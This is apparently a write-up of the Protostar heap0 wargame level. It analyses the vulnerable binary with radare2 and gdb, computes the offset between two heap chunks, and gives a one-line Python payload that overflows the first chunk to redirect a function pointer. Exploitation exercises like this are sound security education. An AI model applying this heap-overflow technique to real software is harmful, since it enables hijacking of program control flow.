This will be the first exploitation of a heap overflow, so for the moment will be something simple, we will see what do we have as first stage using radare2:

	$ r2 heap0
	> aaa
	0x080483b0    1 33           entry0
	0x08048358    1 6            sym.imp.__libc_start_main
	0x080483e0    6 85           sym.__do_global_dtors_aux
	0x08048440    4 35           sym.frame_dummy
	0x08048580    4 42           sym.__do_global_ctors_aux
	0x08048510    1 5            sym.__libc_csu_fini
	0x080485ac    1 28           sym._fini
	0x08048464    1 20           sym.winner
	0x08048398    1 6            sym.imp.puts
	0x08048520    4 90           sym.__libc_csu_init
	0x08048478    1 20           sym.nowinner
	0x0804857a    1 4            sym.__i686.get_pc_thunk.bx
	0x0804848c    1 117          main
	0x08048388    1 6            sym.imp.malloc
	0x08048378    1 6            sym.imp.printf
	0x08048368    1 6            sym.imp.strcpy
	0x08048308    3 48           sym._init
	0x08048348    1 6            loc.imp.__gmon_start
	> afl
	> s main
	> pdf

With this we just print the disassembly of the function main, to see what we have.

	> afvf # list the variables
	> afvn malloc1 dest # rename dest as the first malloc pointer
	> afvn malloc2 var_8h # rename the second malloc destination
	> pdf

We can see that the function does two mallocs and assign them to 2 variables, then thos pointers from malloc are printed to user through a printf function with the string: "data is at %p, fp is at %p\n", so the first malloc is called data, and the second is fp, we can rename them:

	> afvn data malloc1
	> afvn fp malloc2

Then we have two variables "src" and "var_1ch" which are used always as the first and second arguments for functions, so we can rename them too:

	> afvn arg1 src
	> afvn arg2 var_1ch

Okay, now the function looks much better. The function just allocates memory first with a size of 0x40 (64 bytes) and the other with a size of 4 (probably because of alignments of memory, and the algorithms to save space, these will be taken from the same bin of free chunks), then after printing their pointers, the function strcpy is used to copy the input from argv[1] to the space allocated in "data". Finally the memory pointed by "fp" is obtained and the value saved there is called as a function. So what we have to do is to take advantage that those two chunks are allocated together, overflow the first one, and modify the second one to point to wherever we want, with this we will control the program flow.

Let's going to see which functions more are in the program.

	> afl
	> s sym.winner
	> pdf

Here we have a function that prints the message "level passed" this function is in the address: 0x08048464, so we can modify the function pointer in "fp" by one with this address, and the call will be done to this function. We can start the analysis in dynamic with gdb.

	$ gdb -q ./heap0
	> b *0x0804848c # address of main
	> r test
	Breakpoint 1, main

We step until we get the addresses of the heaps:

* first heap: 0x0804a160
* second heap: 0x0804a1b0

Okay, we have the two pointers, so let's going to see the different just with a simple math operation:

0x0804a1b0 - 0x0804a160 = 80

We have a difference of 80, if we are able to copy 80 bytes and then the address, we will have it :), so let's going to run again the program, this time giving 80 'A's and then the address.

The value of 80 was calculated for my machine, but in protostar it worked 72.

	$ ./heap0 `python -c "print 'A'*80 + '\x64\x84\x04\x08'"`
	data is at 0x9f51160, fp is at 0x9f511b0
	level passed

So it looks like, we were able to modify the address saved in that heap, we probably destroyed also the structure from that heap chunk, because we modified the previous size and the size of the structure with 0x4141414141414141. It's interesting, that if we don't modify the value, it's pointing to another function, as we can see in radare2:
	
	call sym.imp.malloc
	mov dword [fp], eax
	mov edx, sym.nowinner
	mov eax, dword [fp]
	mov dword [eax], edx

That function just prints to the screen the string "level has not been passed".